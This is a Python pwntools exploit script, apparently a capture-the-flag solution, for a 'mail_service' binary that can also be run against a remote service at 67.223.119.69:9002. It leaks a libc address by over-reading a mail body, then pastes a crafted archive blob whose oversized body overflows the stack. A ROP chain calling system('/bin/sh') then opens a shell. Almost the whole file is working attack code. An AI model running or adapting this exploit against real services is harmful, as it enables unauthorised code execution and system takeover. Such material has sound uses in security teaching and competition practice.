#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('mail_service_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1AE0
        brva 0x01E7E 
        brva 0x02587 
        brva 0x2403 
        b*0x555555556570
        c
        ''')
        sleep(1)
#  nc 67.223.119.69 9002 

if args.REMOTE:
    p = remote('67.223.119.69', 9002)
else:
    p = process([exe.path])

def compose_mail(sender, rec, subj, body):
    slna(b'> ', 1)
    sla(b'Sender: ', sender)
    sla(b'Recipient: ', rec)
    sla(b'Subject: ', subj)
    sla(b'Body: ', body)

def read_mail(idx):
    slna(b'> ', 3)
    slna(b'id: ', idx)

def archive(idx):
    slna(b'> ', 4)
    slna(b'Mail id: ',idx )


# test
compose_mail(p64(0xdeadbeef), p16(0x3636), p16(0x3737), b'aaaa')
read_mail(1)
ru(b'Body:\n')
r(0x103)
libc.address = u64(r(6) + b'\0\0') - libc.sym._IO_2_1_stdout_ 
info(f'libc leak: {hex(libc.address)}')

archive(1)
# 0x55555555ad50 archive addr

compose_mail(b'a'*0x2f, b'b'*0x2f, b'c'*0x5f, b'e'*0xff)

load = flat(
    p32(0x4c49414d) + p8(1),
    p16(0x30),
    p16(0x30),
    p16(0x60),
    p16(0x200),
)
GDB()

slna(b'> ', 6)
sa(b'Paste archive blob:\n', load)
s(b'a'*0x30)
s(b'b'*0x30)
s(b'c'*0x60)
pop_rdi = 0x00000000000277e5 + libc.address
load = flat(
    b'a'*0x98,
    pop_rdi+1,
    pop_rdi,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system
).ljust(0x200, b'a')

s(load)

p.interactive()
